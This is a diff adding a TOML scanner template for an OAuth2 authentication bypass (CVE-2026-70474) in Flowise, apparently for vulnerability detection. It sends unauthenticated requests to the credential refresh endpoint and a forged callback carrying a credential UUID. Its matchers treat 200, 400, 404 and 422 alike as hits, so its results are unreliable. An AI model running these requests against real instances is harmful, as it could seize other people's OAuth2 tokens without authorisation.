@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "检测 Flowise OAuth2 凭据端点的身份验证绕过漏洞。该漏洞允许未认证攻击者通过 refresh 端点刷新任意凭据的令牌，或通过 callback 端点伪造 OAuth2 回调写入令牌。攻击者只需获取目标凭据 UUID 即可在无需认证的情况下获取外部服务的有效 OAuth2 令牌。"
+id = "POC-AVE-2026-1369"
+name = "CVE-2026-70474 Flowise OAuth2 Authentication Bypass PoC"
+severity = "high"
+tags = ["ave-2026-1369"]
+vuln_id = [
+    "CVE-2026-70474",
+    "AVE-2026-1369",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/oauth2-credential/refresh/{{credential_uuid}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    400,
+    404,
+    422,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/oauth2-credential/callback?code=poc_test_code&state={{credential_uuid}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    400,
+    404,
+    422,
+]
+type = "status"
